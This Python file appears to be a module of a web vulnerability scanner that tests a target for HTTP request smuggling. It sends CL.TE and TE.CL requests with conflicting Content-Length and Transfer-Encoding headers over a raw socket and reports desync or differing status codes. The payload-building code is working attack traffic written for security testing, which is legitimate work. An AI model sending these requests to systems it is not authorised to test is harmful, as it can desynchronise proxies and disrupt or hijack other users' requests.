
import ssl, socket
from core.scanner.module import *

class RequestSmuggling( AttackScan, GlobalLevelScanner ):

    CRLF = "\r\n"
    TIMEOUT = 10

    def __init__(self, config, info = {
        "Authors": ["Abdallah Mohamed"],
        "Name": "HTTP Request Smuggling (HRS)",
        "Description": "The product acts as an intermediary HTTP agent (such as a proxy or firewall) in the data flow between two entities such as a client and server, but it does not interpret malformed HTTP requests or responses in ways that are consistent with how the messages will be processed by those entities that are at the ultimate destination.",
        "Risk": Risk.High,
        "Referances": [
            "https://cwe.mitre.org/data/definitions/444.html",
        ]
    }):
        AttackScan.__init__(self, config, info)
        GlobalLevelScanner.__init__(self, config, info)
        
        self.__body_payload = "wrock"
        self.__body_payload_len = len( self.__body_payload )
        self.__payload = self.__build_payload()
        self.__payload_len = len( self.__payload )

    def InitVulnInfo(self):
        return SmugglingVulnInfo( self.GetEndPoint(), "HTTP Request Smuggling" )

    def GetPayloads(self):
        headers = self.CRLF.join( f"{key}: {str(value)}" for key, value in self.GetHeaders().items() if key not in ("Content-Length", "Transfer-Encoding") )
        
        return [
            (
                "CL.TE", 

                f"POST / HTTP/1.1{self.CRLF}"
                f"Host: {self.GetEndPoint().GetHost()}{self.CRLF}"
                f"{headers}{self.CRLF}"
                f"Content-Length: {str( random.randint(2, self.__body_payload_len) ) + self.CRLF}"
                f"Transfer-Encoding: chunked{self.CRLF}"
                f"Connection: close{self.CRLF * 2}"
                f"{self.__payload}"
            ),
            (
                "TE.CL",

                f"POST / HTTP/1.1{self.CRLF}"
                f"Host: {self.GetEndPoint().GetHost()}{self.CRLF}"
                f"{headers}{self.CRLF}"
                f"Transfer-Encoding: chunked{self.CRLF}"
                f"Content-Length: {str( self.__payload_len + random.randint(2, self.__body_payload_len) )}{self.CRLF}"
                f"Connection: close{self.CRLF * 2}"
                f"{self.__payload}"
            )
        ]

    def run(self):
        req = self.GetEndPoint().GetRequester( self.GetHeaders() )
        norm_resp = req.Send()

        for attack_type, payload in self.GetPayloads():
            status, probe = self.__smuggle( payload )

            if not probe:
                self.vulnInfo.register_vuln( attack_type, "Proxy/backend desync behavior" )
                break

            if status != norm_resp.status_code:
                self.vulnInfo.register_vuln( attack_type, "Suspicious differential behavior" )
                break

        return self.GetModuleInfo()
    
    def __smuggle(self, payload):
        uri = self.GetEndPoint().GetUri()
        ssl_enabled = uri.scheme == "https"
        hostname = ''
        port = 0
        if ':' in uri.netloc:
            hostname, port = uri.netloc.split( ':' )
            port = int( port )
        else:
            hostname = uri.netloc
            port = 443 if ssl_enabled else 80

        conn = socket.create_connection( (hostname, port), timeout=self.TIMEOUT )
        if ssl_enabled:
            context = ssl.create_default_context()
            conn = context.wrap_socket( conn, server_hostname=hostname )

        conn.sendall( payload.encode() )
        res = conn.recv( 0x1000 ).decode( errors="ignore" )
        conn.close()

        if not res:
            return -1, ""
        
        status_code = int( (res.split(self.CRLF)[0]).split(' ')[1] )
        return status_code, res
    
    def __build_payload(self):
        payload = ""
        payload += str(self.__body_payload_len) + self.CRLF
        payload += self.__body_payload + self.CRLF
        payload += "0" + ( self.CRLF * 2 )
        return payload
    

class SmugglingVulnInfo( VulnerabilityInfo ):

    def __init__(self, endpoint, vulnName) -> None:
        VulnerabilityInfo.__init__(self, endpoint, vulnName)

    def _add_vuln_(self, attack_type, indication):
        self.vulnerables.append( {"Attack Type": attack_type, "Indication": indication} )